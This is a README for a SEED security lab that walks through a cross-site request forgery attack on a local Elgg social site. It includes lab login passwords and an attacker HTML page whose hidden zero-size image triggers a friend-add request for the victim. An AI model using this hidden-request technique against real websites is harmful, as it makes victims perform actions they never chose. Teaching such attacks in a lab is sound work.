
This Readme file will enable you to perform CSRF attack on a pre-built Linux virtual machine.

Requirements: 	a) Pre-built Ubuntu virtual machine.
		b) Live HTTP Header (Tool in Mozilla Forifox).

--------------------------------------------------------------------------------------------
		
1. Use the Pre-built Linux virtual machine to perform CSRF attack.

2. Login to root by using the following commands in the terminal.
	
		su root
		seedubuntu  ***Password for root***

3. The Elgg social netwroking website can only be used after starting the apache2 web server. This server has been disabled with the counter measures of CSRF attacks. Use the following command in terminal to start the service.
		
		sudo service apache2 start

4. After starting the apache2 web server, Open Mozilla Firefox and login to the Elgg Social Networking Website.

		
		 www.csrflabelgg.com

5. Login to Alice's profile at Elgg social networking website. Credentials are as following:
		
		Username - alice
		password - seedalice

6. After login, scroll into Alice’s friendlist to find out people in Alice’s friend list. Alice doesn’t have any people in her friends list right now.

7. Logout from Alice's profile.

8. Login to Boby's profile at Elgg social networking website. Credentials are as following:

		Username - boby
		password - seedboby
		
9. At Boby's profile page, perform the following steps:

		Right click on the screen>>>>>>>
		Click on: View Page Source>>>>>>

	Here we need to find the User ID of Boby. Each member on Elgg has a unique user ID. 	The source code for the page opens. 

		Press CTRL+F and search for user>>>>>>>>
		Figure out the user ID from "guid">>>>>>

	In this case user ID is: 40. This user ID will be used in the malicious website that 	will be supplied to Alice.

10. To input the malicious code into the attacker link "http://www.csrflabattacker.com", we need to access the HTML code for the attacker page. To access the HTML code, perform the following steps.

		Open Terminal
		
		cd /var/www/CSRF/Attacker/ *****TYPE THIS*****
		
		*******PRESS ENTER********
		
		/var/www/CSRF/Attacker# ls
		
		*******PRESS ENTER********
		
		*******THE FILES WILL BE LISTED*******
		
		-----------------------------------------
		|  index.html	   index.html-		|
		-----------------------------------------

		sudo gedit index.html

		*******PRESS ENTER********

11. This will be open the html file for attacker's link "http://www.csrflabattacker.com".
Input the following code in the openend HTML.

		<html>
		<head>
		<title>
		Malicious Web
		</title>
		</head>
		<body>
		<h1> Welcome </h1>
		<img width=0 height=0
			src="http://www.csrflabelgg.com/action/friends/add?friend=40">
		</body>
		</html>

	Save the file. This code contains Fake Image and request contains an action that 	will be executed whenever the link is triggered.

12. Log into Alice’s account again. Till now Alice has no friends.

13. Go to tools of Mozilla Firefox to clear all history from the browser (Sometimes the changes in the HTML code doesn't get reflected without cleaning the history fom browser. DO NOT UNCHECK "CACHE" AS THIS WOULD CLEAR THE COOKIES TOO).

14. Before hitting the attacker's link, open the Live HTTP Header to record the Header's.

		Tools>>>>>>>
		Live HTTP Header>>>>>>>

15. Hit the attacker's link, "http://www.csrflabattacker.com" in the new tab of same browser.

16. Go to tab Elgg tab (Alice's friendlist) and refresh the page.

17. Boby will be added to Alice's friendlist. 




------------------------------------------------------------------------------------------



This is a demonstration of CSRF attack.		
					